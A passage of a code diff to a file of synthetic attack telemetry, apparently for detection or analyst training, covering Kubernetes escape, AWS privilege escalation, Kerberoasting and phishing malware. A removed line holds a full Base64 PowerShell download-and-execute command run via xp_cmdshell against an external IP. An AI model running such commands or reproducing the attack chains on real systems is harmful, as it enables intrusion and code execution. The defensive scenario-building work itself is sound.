         "kubernetes.audit.objectRef.namespace": "production",
         "kubernetes.audit.user.username": "system:serviceaccount:cicd:ci-deploy",
-        "kubernetes.audit.sourceIPs[0]": "185.220.101.47",
+        "kubernetes.audit.sourceIPs[0]": "193.233.48.71",
         "kubernetes.audit.responseStatus.code": 200,
         "kubernetes.audit.responseObject.spec.hostPID": true,
         "kubernetes.audit.responseObject.spec.containers[0].securityContext.privileged": true,
@@ -4873,7 +4709,7 @@ export function k8sPodEscapeScenarioEvents() {
       },
     },
     {
-      id: "k8s_02_nsenter_escape",
+      id: "k8s_02_nsenter_escape", is_detection: true,
       ts: T(2 * MIN),
       source: "edr", vendor: "CrowdStrike Falcon",
       event_type: "process_create", severity: "critical", mitre_technique: "T1611",
@@ -4926,8 +4762,8 @@ export function k8sPodEscapeScenarioEvents() {
       ts: T(5 * MIN),
       source: "cloudtrail", vendor: "AWS CloudTrail",
       event_type: "cloud_api_call", severity: "medium", mitre_technique: "T1552.005",
-      src_ip: "185.220.101.47", dst_port: 443,
-      description: "GetCallerIdentity was called using the eks-node-role assumed role from 185.220.101.47 — an IP outside AWS's published ranges.",
+      src_ip: "193.233.48.71", dst_port: 443,
+      description: "GetCallerIdentity was called using the eks-node-role assumed role from 193.233.48.71 — an IP outside AWS's published ranges.",
       fp_explanation: "GetCallerIdentity is one of the most common calls in any AWS account — the SDKs issue it on startup to confirm which identity they are running as, so it appears constantly in CloudTrail for healthy workloads.",
       raw: {
         "aws.cloudtrail.eventName": "GetCallerIdentity",
@@ -4935,7 +4771,7 @@ export function k8sPodEscapeScenarioEvents() {
         "aws.cloudtrail.userIdentity.type": "AssumedRole",
         "aws.cloudtrail.userIdentity.arn": "arn:aws:sts::123456789012:assumed-role/eks-node-role/i-0abc123",
         "aws.cloudtrail.userIdentity.accountId": "123456789012",
-        "aws.cloudtrail.sourceIPAddress": "185.220.101.47",
+        "aws.cloudtrail.sourceIPAddress": "193.233.48.71",
         "aws.cloudtrail.userAgent": "aws-cli/2.13.0 Python/3.11.4",
         "aws.cloudtrail.errorCode": "",
         "aws.cloudtrail.responseElements.Account": "123456789012",
@@ -4946,14 +4782,14 @@ export function k8sPodEscapeScenarioEvents() {
       ts: T(6 * MIN),
       source: "cloudtrail", vendor: "AWS CloudTrail",
       event_type: "cloud_api_call", severity: "high", mitre_technique: "T1580",
-      src_ip: "185.220.101.47",
+      src_ip: "193.233.48.71",
       description: "ListBuckets was called using the same assumed role from the same external IP, returning 14 buckets.",
       raw: {
         "aws.cloudtrail.eventName": "ListBuckets",
         "aws.cloudtrail.eventSource": "s3.amazonaws.com",
         "aws.cloudtrail.userIdentity.type": "AssumedRole",
         "aws.cloudtrail.userIdentity.arn": "arn:aws:sts::123456789012:assumed-role/eks-node-role/i-0abc123",
-        "aws.cloudtrail.sourceIPAddress": "185.220.101.47",
+        "aws.cloudtrail.sourceIPAddress": "193.233.48.71",
       },
     },
     {
@@ -4961,14 +4797,14 @@ export function k8sPodEscapeScenarioEvents() {
       ts: T(7 * MIN),
       source: "cloudtrail", vendor: "AWS CloudTrail",
       event_type: "cloud_api_call", severity: "high", mitre_technique: "T1580",
-      src_ip: "185.220.101.47",
+      src_ip: "193.233.48.71",
       description: "DescribeInstances was called using the same assumed role, requesting up to 1000 results.",
       raw: {
         "aws.cloudtrail.eventName": "DescribeInstances",
         "aws.cloudtrail.eventSource": "ec2.amazonaws.com",
         "aws.cloudtrail.userIdentity.type": "AssumedRole",
         "aws.cloudtrail.userIdentity.arn": "arn:aws:sts::123456789012:assumed-role/eks-node-role/i-0abc123",
-        "aws.cloudtrail.sourceIPAddress": "185.220.101.47",
+        "aws.cloudtrail.sourceIPAddress": "193.233.48.71",
         "aws.cloudtrail.requestParameters.maxResults": 1000,
       },
     },
@@ -4977,14 +4813,14 @@ export function k8sPodEscapeScenarioEvents() {
       ts: T(9 * MIN),
       source: "cloudtrail", vendor: "AWS CloudTrail",
       event_type: "cloud_storage_access", severity: "critical", mitre_technique: "T1530",
-      src_ip: "185.220.101.47",
-      description: "GetObject retrieved s3://rocketstack-secrets-prod/db-passwords.json (4,218 bytes) using the same assumed role from 185.220.101.47.",
+      src_ip: "193.233.48.71",
+      description: "GetObject retrieved s3://rocketstack-secrets-prod/db-passwords.json (4,218 bytes) using the same assumed role from 193.233.48.71.",
       raw: {
         "aws.cloudtrail.eventName": "GetObject",
         "aws.cloudtrail.eventSource": "s3.amazonaws.com",
         "aws.cloudtrail.userIdentity.type": "AssumedRole",
         "aws.cloudtrail.userIdentity.arn": "arn:aws:sts::123456789012:assumed-role/eks-node-role/i-0abc123",
-        "aws.cloudtrail.sourceIPAddress": "185.220.101.47",
+        "aws.cloudtrail.sourceIPAddress": "193.233.48.71",
         "aws.cloudtrail.requestParameters.bucketName": "rocketstack-secrets-prod",
         "aws.cloudtrail.requestParameters.key": "db-passwords.json",
         "aws.cloudtrail.responseElements.contentLength": 4218,
@@ -4995,20 +4831,20 @@ export function k8sPodEscapeScenarioEvents() {
       ts: T(12 * MIN),
       source: "k8s_audit", vendor: "Kubernetes Audit",
       event_type: "k8s_pod_create", severity: "critical", mitre_technique: "T1610",
-      src_ip: "185.220.101.47",
-      description: "ci-deploy-token created a pod named svc-monitoring-backup in kube-system with hostPID, hostNetwork, and privileged:true, pulling its image from 185.220.101.47:5000.",
+      src_ip: "193.233.48.71",
+      description: "ci-deploy-token created a pod named svc-monitoring-backup in kube-system with hostPID, hostNetwork, and privileged:true, pulling its image from 193.233.48.71:5000.",
       raw: {
         "kubernetes.audit.verb": "create",
         "kubernetes.audit.objectRef.resource": "pods",
         "kubernetes.audit.objectRef.namespace": "kube-system",
         "kubernetes.audit.objectRef.name": "svc-monitoring-backup",
         "kubernetes.audit.user.username": "ci-deploy-token",
-        "kubernetes.audit.sourceIPs[0]": "185.220.101.47",
+        "kubernetes.audit.sourceIPs[0]": "193.233.48.71",
         "kubernetes.audit.responseStatus.code": 201,
         "kubernetes.audit.requestObject.spec.hostPID": true,
         "kubernetes.audit.requestObject.spec.hostNetwork": true,
         "kubernetes.audit.requestObject.spec.containers[0].securityContext.privileged": true,
-        "kubernetes.audit.requestObject.spec.containers[0].image": "185.220.101.47:5000/backdoor:latest",
+        "kubernetes.audit.requestObject.spec.containers[0].image": "193.233.48.71:5000/backdoor:latest",
       },
     },
     {
@@ -5016,19 +4852,19 @@ export function k8sPodEscapeScenarioEvents() {
       ts: T(15 * MIN),
       source: "cloudtrail", vendor: "AWS CloudTrail",
       event_type: "account_create", severity: "critical", mitre_technique: "T1136.003",
-      src_ip: "185.220.101.47",
+      src_ip: "193.233.48.71",
       // SPLIT from a single record that carried eventName "CreateUser" together
       // with requestParameters.policyArn. CreateUser accepts userName, path and
       // tags — never a policy ARN. Attaching a managed policy is a separate
       // AttachUserPolicy call, and merging them hid the single most important
       // pivot in the scenario: the moment the privilege was actually granted.
-      description: "CreateUser created IAM user svc-monitoring-backup, called with the eks-node-role assumed role from 185.220.101.47.",
+      description: "CreateUser created IAM user svc-monitoring-backup, called with the eks-node-role assumed role from 193.233.48.71.",
       raw: {
         "aws.cloudtrail.eventName": "CreateUser",
         "aws.cloudtrail.eventSource": "iam.amazonaws.com",
         "aws.cloudtrail.userIdentity.type": "AssumedRole",
         "aws.cloudtrail.userIdentity.arn": "arn:aws:sts::123456789012:assumed-role/eks-node-role/i-0abc123",
-        "aws.cloudtrail.sourceIPAddress": "185.220.101.47",
+        "aws.cloudtrail.sourceIPAddress": "193.233.48.71",
         "aws.cloudtrail.requestParameters.userName": "svc-monitoring-backup",
         "aws.cloudtrail.requestParameters.path": "/",
         "aws.cloudtrail.responseElements.user.userId": "AIDIODR4TAW7CSEXAMPLE",
@@ -5040,14 +4876,14 @@ export function k8sPodEscapeScenarioEvents() {
       ts: T(15 * MIN + 11_000),
       source: "cloudtrail", vendor: "AWS CloudTrail",
       event_type: "cloud_role_change", severity: "critical", mitre_technique: "T1098.003",
-      src_ip: "185.220.101.47",
+      src_ip: "193.233.48.71",
       description: "AttachUserPolicy attached the AWS-managed AdministratorAccess policy to svc-monitoring-backup, eleven seconds after the account was created.",
       raw: {
         "aws.cloudtrail.eventName": "AttachUserPolicy",
         "aws.cloudtrail.eventSource": "iam.amazonaws.com",
         "aws.cloudtrail.userIdentity.type": "AssumedRole",
         "aws.cloudtrail.userIdentity.arn": "arn:aws:sts::123456789012:assumed-role/eks-node-role/i-0abc123",
-        "aws.cloudtrail.sourceIPAddress": "185.220.101.47",
+        "aws.cloudtrail.sourceIPAddress": "193.233.48.71",
         "aws.cloudtrail.requestParameters.userName": "svc-monitoring-backup",
         "aws.cloudtrail.requestParameters.policyArn": "arn:aws:iam::aws:policy/AdministratorAccess",
         "aws.cloudtrail.responseElements": "null",
@@ -5117,7 +4953,7 @@ export function oauthConsentPhishingScenarioEvents() {
       source: "o365", vendor: "Microsoft 365 Unified Audit Log",
       event_type: "cloud_api_call", severity: "high", mitre_technique: "T1114.002",
       hostname: "graph.microsoft.com", user_email: "j.chen@nexacorp.com", src_ip: "40.99.8.12",
-      description: "The Productivity Suite Pro app accessed 1,247 items in j.chen's mailbox via Microsoft Graph, 55 minutes after consent was granted.",
+      description: "The Productivity Suite Pro app read items in j.chen's mailbox via Microsoft Graph, 55 minutes after consent was granted.",
       fp_explanation: "MailItemsAccessed by an application is common — CRM tools and archival apps do this constantly. The Microsoft 365 compliance center logs thousands of these per day.",
       raw: {
         "data.office365.Operation": "MailItemsAccessed",
@@ -5176,7 +5012,7 @@ export function oauthConsentPhishingScenarioEvents() {
       source: "o365", vendor: "Microsoft 365 Unified Audit Log",
       event_type: "sharepoint_access", severity: "high", mitre_technique: "T1530",
       hostname: "nexacorp.sharepoint.com", user_email: "j.chen@nexacorp.com", src_ip: "40.99.8.12",
-      description: "312 files on the Finance SharePoint site were accessed with UserId set to the app's own ID.",
+      description: "Files on the Finance SharePoint site were accessed with UserId set to the app's own ID.",
       raw: {
         "data.office365.Operation": "FileAccessed",
         "data.office365.UserId": APP_ID,
@@ -5282,7 +5118,6 @@ export function kerberoastingScenarioEvents() {
   const attackerHost = "WS-DEV-4412";
   const attackerUser = "m.cohen@nexacorp.com";
   const attackerIp = "10.10.30.44";
-  const dcIp = "10.10.1.5";
 
   const events: TelemetryEvent[] = [
     // T+0: Normal domain auth — attacker foothold
@@ -5323,67 +5158,17 @@ export function kerberoastingScenarioEvents() {
       },
     },
 
-    // ── CORRELATED: LDAP BloodHound-style SPN query from attacker host ────────────
-    {
-      id: "evt_kerb_bloodhound_ldap", ts: T(1 * MIN),
-      source: "ad", vendor: "Microsoft Defender for Identity",
-      event_type: "ids_signature", severity: "high",
-      hostname: attackerHost, src_ip: attackerIp,
-      mitre_technique: "T1087.002",
-      description: "Microsoft Defender for Identity flagged the LDAP SPN wildcard query from WS-DEV-4412 as a BloodHound/PowerView reconnaissance pattern.",
-      raw: {
-        "event.action": "LdapSearch",
-        "event.outcome": "success",
-        "mdi.alert.type": "LdapSearchReconnaissanceUsingSamr",
-        "mdi.alert.description": "LDAP query with servicePrincipalName wildcard filter — BloodHound/PowerView pattern",
-        "mdi.source.computer": attackerHost,
-        "mdi.source.user": "m.cohen",
-        "ldap.filter": "(&(objectCategory=user)(servicePrincipalName=*))",
-        "ldap.attributes_requested": "servicePrincipalName,sAMAccountName,pwdLastSet",
-        "ldap.results_count": "12",
-        "process.name": "powershell.exe",
-        "user.name": "NEXACORP\\m.cohen",
-        "host.name": attackerHost,
-        "source.ip": attackerIp,
-      },
-    },
-
-    // T+2min: LDAP query to enumerate SPNs (T1087.002 / BloodHound/PowerView)
-    {
-      id: "evt_kerb_02_ldap_spn", ts: T(2 * MIN),
-      source: "ad", vendor: "Windows Security", event_type: "cloud_api_call",
-      hostname: attackerHost, user_email: attackerUser, src_ip: attackerIp,
-      severity: "high", mitre_technique: "T1087.002", mitre_tactic: "Discovery",
-      description: "m.cohen's workstation sent an LDAP query for every account with a servicePrincipalName set, returning 12 results.",
-      raw: {
-        "winlog.event_id": "4662",
-        "winlog.channel": "Security",
-        "winlog.computer_name": dcIp,
-        "winlog.provider_name": "Microsoft-Windows-Security-Auditing",
-        "winlog.event_data.SubjectUserName": "m.cohen",
-        "winlog.event_data.SubjectDomainName": "NEXACORP",
-        "winlog.event_data.ObjectType": "servicePrincipalName",
-        "winlog.event_data.ObjectName": "CN=Users,DC=nexacorp,DC=com",
-        "winlog.event_data.AccessMask": "0x100",
-        "winlog.event_data.Properties": "Read Property",
-        "event.code": "4662",
-        "event.action": "object-access",
-        "event.outcome": "success",
-        "ldap.filter": "(&(objectCategory=user)(servicePrincipalName=*))",
-        "ldap.scope": "subtree",
-        "ldap.attributes_requested": ["servicePrincipalName", "sAMAccountName", "distinguishedName", "pwdLastSet"],
-        "ldap.results_returned": "12",
-        "user.name": "NEXACORP\\m.cohen",
-        "host.name": dcIp,
-        "source.ip": attackerIp,
-      },
-    },
+    // (REMOVED evt_kerb_02_ldap_spn and evt_kerb_bloodhound_ldap. The first was a
+    // client's LDAP search filter logged as a DC 4662 — a DC records no such
+    // thing. The second was a Defender for Identity row with an invented alert
+    // type, timestamped BEFORE the query it flagged. The directory-side evidence
+    // is now evt_kerb_02_mdi_spn_exposure, after the ticket requests it reports.)
 
     // T+4min: TGS request for MSSQLSvc (T1558.003 — Kerberoasting)
     {
       id: "evt_kerb_03_tgs_sql", ts: T(4 * MIN),
       source: "ad", vendor: "Windows Security", event_type: "auth_success",
-      hostname: dcIp, user_email: attackerUser, src_ip: attackerIp,
+      hostname: "DC01", user_email: attackerUser, src_ip: attackerIp,
       severity: "high", mitre_technique: "T1558.003", mitre_tactic: "Credential Access",
       description: "m.cohen requested a Kerberos TGS ticket for MSSQLSvc/srv-db01:1433 (svc-mssql) using RC4 encryption (0x17), two minutes after the SPN enumeration.",
       raw: {
@@ -5418,7 +5203,7 @@ export function kerberoastingScenarioEvents() {
     {
       id: "evt_kerb_04_tgs_iis", ts: T(4 * MIN + 20_000),
       source: "ad", vendor: "Windows Security", event_type: "auth_success",
-      hostname: dcIp, user_email: attackerUser, src_ip: attackerIp,
+      hostname: "DC01", user_email: attackerUser, src_ip: attackerIp,
       severity: "high", mitre_technique: "T1558.003", mitre_tactic: "Credential Access",
       description: "m.cohen requested a second RC4-encrypted TGS ticket, this time for HTTP/intranet.corp (svc-iis), 20 seconds after the first.",
       raw: {
@@ -5452,7 +5237,7 @@ export function kerberoastingScenarioEvents() {
     {
       id: "evt_kerb_05_tgs_backup", ts: T(4 * MIN + 40_000),
       source: "ad", vendor: "Windows Security", event_type: "auth_success",
-      hostname: dcIp, user_email: attackerUser, src_ip: attackerIp,
+      hostname: "DC01", user_email: attackerUser, src_ip: attackerIp,
       severity: "high", mitre_technique: "T1558.003", mitre_tactic: "Credential Access",
       description: "A third RC4-encrypted TGS ticket was requested for BACKUP/srv-backup01 (svc-backup), the third in 40 seconds.",
       raw: {
@@ -5482,25 +5267,71 @@ export function kerberoastingScenarioEvents() {
       },
     },
 
+    // ── First alert: Defender for Identity, after the requests it reports ─────
+    // Its real alert name for an account enumerating SPN holders and pulling
+    // their service tickets, as the alert lands in the SIEM (SecurityAlert):
+    // name, window, entities — source computer and account, the target accounts.
+    {
+      id: "evt_kerb_02_mdi_spn_exposure", ts: T(6 * MIN),
+      source: "ad", vendor: "Microsoft Defender for Identity",
+      event_type: "ids_signature", severity: "high", is_detection: true,
+      hostname: attackerHost, user_email: attackerUser, src_ip: attackerIp,
+      mitre_technique: "T1558.003", mitre_tactic: "Credential Access",
+      description: "Defender for Identity raised 'Suspected Kerberos SPN exposure' for m.cohen on WS-DEV-4412 (10.10.30.44), naming 12 target service accounts including svc-mssql, svc-iis and svc-backup.",
+      raw: {
+        "TimeGenerated": T(6 * MIN),
+        "AlertName": "Suspected Kerberos SPN exposure",
+        "AlertSeverity": "High",
+        "ProductName": "Azure Advanced Threat Protection",
+        "VendorName": "Microsoft",
+        "SystemAlertId": "b3e81d52-7c40-4f9a-a6d1-2f95c0e7b418",
+        "Status": "New",
+        "StartTime": T(4 * MIN),
+        "EndTime": T(5 * MIN + 30_000),
+        "Tactics": "CredentialAccess",
+        "Techniques": "[\"T1558\"]",
+        "CompromisedEntity": "m.cohen",
+        "Entities": JSON.stringify([
+          { $id: "2", HostName: attackerHost, DnsDomain: "nexacorp.com", Type: "host" },
+          { $id: "3", Address: attackerIp, Type: "ip" },
+          { $id: "4", Name: "m.cohen", NTDomain: "NEXACORP", Type: "account" },
+          { $id: "5", Name: "svc-mssql", NTDomain: "NEXACORP", Type: "account" },
+          { $id: "6", Name: "svc-iis", NTDomain: "NEXACORP", Type: "account" },
+          { $id: "7", Name: "svc-backup", NTDomain: "NEXACORP", Type: "account" },
+        ]),
+        "ExtendedProperties": JSON.stringify({ "Target accounts": "12", "Source computer": attackerHost, "Source account": "m.cohen" }),
+      },
+    },
+
     // T+8min: Volume spike — 12 TGS tickets in 90 seconds
     {
       id: "evt_kerb_06_ticket_spike", ts: T(8 * MIN),
       source: "siem", vendor: "Microsoft Sentinel", event_type: "ids_signature",
-      hostname: dcIp, src_ip: attackerIp,
+      hostname: "DC01", src_ip: attackerIp,
       severity: "high", mitre_technique: "T1558.003", mitre_tactic: "Credential Access",
-      description: "Microsoft Sentinel correlated 12 RC4-encrypted TGS ticket requests from m.cohen across 12 distinct SPNs within 90 seconds.",
+      description: "Microsoft Sentinel rule 'Anomalous Kerberos service ticket volume' matched 12 RC4 (0x17) TGS requests from m.cohen for 12 distinct service accounts within 90 seconds.",
+      // Analytics-rule alert as Sentinel stores it: the rule name, the counts it
+      // measured and the entities — no verdict ("MassKerberoasting") of its own.
       raw: {
-        "AlertName": "Kerberoasting_Volume_Spike",
-        "alert.rule.id": "KERB-SPIKE-001",
-        "target.user.name": "m.cohen",
+        "AlertName": "Anomalous Kerberos service ticket volume",
+        "AlertSeverity": "High",
+        "ProductName": "Azure Sentinel",
+        "ProviderName": "ASI Scheduled Alerts",
+        "AlertType": "c1d4e7a2-58b3-4f06-9e21-7a3b5c8d0f14_8f2a6e3c-1b47-4d95-a0c8-6e9f2b5d7a31",
+        "Status": "New",
+        "Tactics": "CredentialAccess",
+        "Techniques": "[\"T1558\"]",
+        "CompromisedEntity": "m.cohen",
+        "ExtendedProperties.Query Period": "01:00:00",
         "ExtendedProperties.Number of events": 12,
         "ExtendedProperties.Time window (s)": 90,
+        "ExtendedProperties.TicketEncryptionType": "0x17",
         "ExtendedProperties.Domain Controller": "DC01.nexacorp.com",
         "ExtendedProperties.Targeted SPNs": ["MSSQLSvc/srv-db01:1433", "HTTP/intranet.corp", "BACKUP/srv-backup01", "MSSQL/srv-db02:1433", "svc-sharepoint/sharepoint.corp:443", "wsman/srv-mgmt01", "cifs/srv-file01", "termserv/srv-rdp01", "svc-sap/sap-prod01:3200", "exchange/mail.corp", "svc-jenkins/jenkins01:8080", "svc-gitlab/gitlab.corp"],
-        "event.action": "correlation-alert",
-        "event.outcome": "alerted",
-        "alert.type": "MassKerberoasting",
-        "source.ip": attackerIp,
+        "Entities": JSON.stringify([
+          { $id: "2", Name: "m.cohen", NTDomain: "NEXACORP", Type: "account" },
+          { $id: "3", Address: attackerIp, Type: "ip" },
+        ]),
       },
     },
 
@@ -5508,7 +5339,7 @@ export function kerberoastingScenarioEvents() {
     {
       id: "evt_kerb_07_svcacct_login", ts: T(15 * MIN),
       source: "ad", vendor: "Windows Security", event_type: "auth_success",
-      hostname: "srv-db01", src_ip: "10.10.30.44",
+      hostname: "srv-db01", user_email: "svc-mssql@nexacorp.com", src_ip: attackerIp,
       severity: "critical", mitre_technique: "T1078", mitre_tactic: "Initial Access",
       description: "The svc-mssql service account logged on with an interactive session (Type 10, RemoteInteractive) to srv-db01 from WS-DEV-4412.",
       raw: {
@@ -5573,7 +5404,10 @@ export function kerberoastingScenarioEvents() {
       source: "db_monitor", vendor: "IBM Guardium", event_type: "db_query",
       hostname: "srv-db01", src_ip: attackerIp,
       severity: "critical", mitre_technique: "T1059.001", mitre_tactic: "Execution",
-      description: "svc-mssql ran EXEC xp_cmdshell on srv-db01 to launch a hidden, Base64-encoded PowerShell command.",
+      // The Guardium statement is truncated as the DAM console shows long
+      // statements; it used to embed the same download host as dns-tunneling.
+      // What the command did next is evt_kerb_09_db_outbound.
+      description: "svc-mssql executed EXEC xp_cmdshell on srv-db01 from 10.10.30.44 (osql.exe); the command is powershell -WindowStyle Hidden with a Base64 -enc argument.",
       process: { name: "sqlservr.exe", pid: 2200, path: "C:\\Program Files\\Microsoft SQL Server\\MSSQL16.MSSQLSERVER\\MSSQL\\Binn\\sqlservr.exe", cmdline: "xp_cmdshell 'powershell -enc SQBFAFgAIAAo...'", user: "svc-mssql", integrity: "high" },
       raw: {
         "db.vendor": "IBM Guardium",
@@ -5581,7 +5415,7 @@ export function kerberoastingScenarioEvents() {
         "db.instance": "srv-db01",
         "db.name": "master",
         "db.user": "svc-mssql",
-        "db.statement": "EXEC xp_cmdshell 'powershell -WindowStyle Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADMALgA0ADIALgAzADYALgA1ADgALwBwAGEAeQBsAG8AYQBkAC4AcABzADEAJwApAA=='",
+        "db.statement": "EXEC xp_cmdshell 'powershell -WindowStyle Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA...'",
         "db.rows_affected": 0,
         "db.duration_ms": 1200,
         "db.operation": "EXEC",
@@ -5593,6 +5427,30 @@ export function kerberoastingScenarioEvents() {
         "event.outcome": "success",
         "user.name": "svc-mssql",
         "host.name": "srv-db01",
+      },
+    },
+
+    // T+18min+6s: the database server's first outbound session — scope / containment pivot
+    // A SQL server has no business opening HTTPS to the internet; this row gives
+    // the analyst the external address to block and hunt for elsewhere.
+    {
+      id: "evt_kerb_09_db_outbound", ts: T(18 * MIN + 6_000),
+      source: "firewall", vendor: "FortiGate",
+      event_type: "net_connection", severity: "high", mitre_technique: "T1105", mitre_tactic: "Command and Control",
+      hostname: "srv-db01", src_ip: "10.10.30.61", dst_ip: "91.243.85.117", dst_port: 443,
+      description: "srv-db01 opened an outbound TCP/443 session to 91.243.85.117, six seconds after the xp_cmdshell call.",
+      raw: {
+        "data.type": "traffic",
+        "data.subtype": "forward",
+        "data.srcip": "10.10.30.61",
+        "data.dstip": "91.243.85.117",
+        "data.dstport": "443",
+        "data.proto": "6",
+        "data.action": "accept",
+        "data.app": "SSL",
+        "data.sentbyte": 2_184,
+        "data.rcvdbyte": 48_612,
+        "data.sessionid": "73318842",
       },
     },
 
@@ -5738,7 +5596,7 @@ export function dnsTunnelingScenarioEvents() {
       event_type: "net_connection", severity: "high",
       hostname: victimHost, user_email: victimEmail, src_ip: victimIp,
       mitre_technique: "T1071.004",
-      description: "Defender for Endpoint identified update.exe (PID 4488) as the process generating the 847 queries/minute to the corporate DNS server.",
+      description: "Defender for Endpoint identified update.exe (PID 4488) as the process generating the high-rate queries to the corporate DNS server.",
       raw: {
         "event.provider": "Microsoft Defender ATP",
         "event.dataset": "DeviceNetworkEvents",
@@ -6388,64 +6246,90 @@ export function phishingMalwareScenarioEvents() {
 
   const victim = { hostname: "WS-HR-1182", email: "r.avraham@nexacorp.com", ip: "10.10.40.63" };
   const c2Domain = "shiptrack-updates-net.xyz";
-  const c2Ip = "185.220.101.204";
+  // Story-specific infrastructure (no other storyline uses these addresses).
+  const c2Ip = "194.26.135.88";
+  const senderIp = "146.70.53.21";
+  const msgId = "<3f8b2a71-shiptrack-delivery-48213@shiptrack-express.info>";
   const fileHash = makeSha256("delivery_notice_48213_pdf_exe_trojan");
+  const zipHash = makeSha256("delivery_notice_48213_zip_container");
+  const zipPath = "C:\\Users\\r.avraham\\Downloads\\Delivery_Notice_48213.zip";
+  const exePath = "C:\\Users\\r.avraham\\Downloads\\Delivery_Notice_48213\\Delivery_Notice_48213.pdf.exe";
+  const mail = {
+    "InternetMessageId": msgId,
+    "email.from.address": "notifications@shiptrack-express.info",
+    "email.to.address": victim.email,
+    "email.subject": "Your Package Could Not Be Delivered — Action Required",
+    "email.attachments.file.name": "Delivery_Notice_48213.zip",
+    "email.attachments.file.hash.sha256": zipHash,
+    "email.attachments.file.size": 18422,
+    "email.direction": "inbound",
+    "source.ip": senderIp,
+  };
 
   const events: TelemetryEvent[] = [
     {
       id: "evt_pm_01_email", ts: T(0),
       source: "email_gateway", vendor: "Microsoft Defender for Office 365", event_type: "email_received",
-      user_email: victim.email, src_ip: "45.148.10.77",
+      user_email: victim.email, src_ip: senderIp,
       severity: "medium", mitre_technique: "T1566.001",
-      description: "r.avraham received an email with a ZIP attachment (Delivery_Notice_48213.zip) from an external look-alike sender (notifications@shiptrack-express.info) impersonating a shipping company.",
+      description: "r.avraham received an email with a ZIP attachment (Delivery_Notice_48213.zip) from an external sender (notifications@shiptrack-express.info) that failed SPF, DKIM and DMARC; it was delivered to the inbox.",
       raw: {
+        ...mail,
         "event.action": "EmailDelivered", "event.outcome": "success",
-        "email.from.address": "notifications@shiptrack-express.info",
-        "email.to.address": victim.email,
-        "email.subject": "Your Package Could Not Be Delivered — Action Required",
-        "email.attachment.name": "Delivery_Notice_48213.zip",
-        "email.direction": "inbound",
-        "email.message_id": "<3f8b2a71-shiptrack-delivery-48213@shiptrack-express.info>",
-        "file.size": "18422",
-        "source.ip": "45.148.10.77",
         "spf.result": "fail", "dkim.result": "fail", "dmarc.result": "fail",
         "action_result": "delivered",
-        "threat.category": "Phishing",
-        "data.office365.NetworkMessageId": "e7a91c4f-3b62-4d18-9e05-6c8f2a7b19e3",
-        "data.office365.InternetMessageId": "<3f8b2a71-shiptrack-delivery-48213@shiptrack-express.info>",
       },
+    },
+    {
+      // The attachment row of the same message — the ZIP's SHA256 (EmailEvents has no hash column).
+      id: "evt_pm_01b_attachment", ts: T(0),
+      source: "email_gateway", vendor: "Microsoft Defender for Office 365", event_type: "email_received",
+      user_email: victim.email,
+      severity: "informational", mitre_technique: "T1566.001",
+      description: "The message's attachment record lists Delivery_Notice_48213.zip (18,422 bytes) with its SHA256.",
+      raw: { ...mail, "category": "AdvancedHunting-EmailAttachmentInfo", "action_result": "delivered" },
+    },
+    {
+      id: "evt_pm_01c_save", ts: T(5 * MIN + 20_000),
+      source: "edr", vendor: "CrowdStrike Falcon", event_type: "file_create",
+      hostname: victim.hostname, user_email: victim.email, src_ip: victim.ip,
+      severity: "low", mitre_technique: "T1566.001",
+      file: { path: zipPath, sha256: zipHash, size: 18422 },
+      // A webmail download — the same in an M365 or a Google Workspace shop (no desktop mail client named).
+      process: { name: "chrome.exe", pid: 5016, path: "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", user: "NEXACORP\\r.avraham", integrity: "medium" },
+      description: "chrome.exe on WS-HR-1182 saved Delivery_Notice_48213.zip from the webmail session to r.avraham's Downloads folder (same SHA256 as the email attachment).",
+      raw: { "crowdstrike.event_simpleName": "ZipFileWritten", "file.path": zipPath, "file.hash.sha256": zipHash, "host.name": victim.hostname, "user.name": "NEXACORP\\r.avraham" },
+    },
+    {
+      id: "evt_pm_01d_extract", ts: T(5 * MIN + 45_000),
+      source: "edr", vendor: "CrowdStrike Falcon", event_type: "file_create",
+      hostname: victim.hostname, user_email: victim.email, src_ip: victim.ip,
+      severity: "medium", mitre_technique: "T1204.002",
+      file: { path: exePath, sha256: fileHash, size: 391168 },
+      process: { name: "explorer.exe", pid: 3140, path: "C:\\Windows\\explorer.exe", user: "NEXACORP\\r.avraham", integrity: "medium" },
+      description: "explorer.exe on WS-HR-1182 extracted Delivery_Notice_48213.pdf.exe from the ZIP into a Delivery_Notice_48213 folder under Downloads.",
+      raw: { "crowdstrike.event_simpleName": "NewExecutableWritten", "file.path": exePath, "file.hash.sha256": fileHash, "host.name": victim.hostname, "user.name": "NEXACORP\\r.avraham" },
     },
     {
       id: "evt_pm_02_execute", ts: T(6 * MIN),
       source: "edr", vendor: "CrowdStrike Falcon", event_type: "process_create",
       hostname: victim.hostname, user_email: victim.email, src_ip: victim.ip,
       severity: "high", mitre_technique: "T1204.002",
-      description: "r.avraham extracted the ZIP and ran Delivery_Notice_48213.pdf.exe from the Downloads folder on WS-HR-1182; explorer.exe was the parent process.",
+      description: "r.avraham ran Delivery_Notice_48213.pdf.exe from the extracted folder on WS-HR-1182; explorer.exe was the parent process and the binary is unsigned.",
       process: {
         name: "Delivery_Notice_48213.pdf.exe", pid: 6624, parent_name: "explorer.exe", parent_pid: 3140,
-        cmdline: "\"C:\\Users\\r.avraham\\Downloads\\Delivery_Notice_48213.pdf.exe\"",
+        path: exePath,
+        cmdline: `"${exePath}"`,
         user: "NEXACORP\\r.avraham", integrity: "medium",
         hash: { sha256: fileHash },
       },
       raw: {
         "crowdstrike.event_simpleName": "ProcessRollup2",
-        "crowdstrike.detection.id": "ldt:37a7bf65f9703d4bb6257bab115ba2f3:2234567890",
-        "crowdstrike.detection.description": "Unsigned executable with double file extension (.pdf.exe) launched directly by explorer.exe from the user's Downloads folder.",
-        "crowdstrike.detection.scenario": "suspicious_double_extension_execution",
-        "crowdstrike.detection.tactic": "Execution",
-        "crowdstrike.detection.tactic_id": "TA0002",
-        "crowdstrike.detection.technique": "User Execution: Malicious File",
-        "crowdstrike.detection.technique_id": "T1204.002",
-        "crowdstrike.detection.pattern_disposition": "10",
-        "crowdstrike.detection.pattern_disposition_description": "Detection, No Action",
-        "crowdstrike.detection.severity": "High",
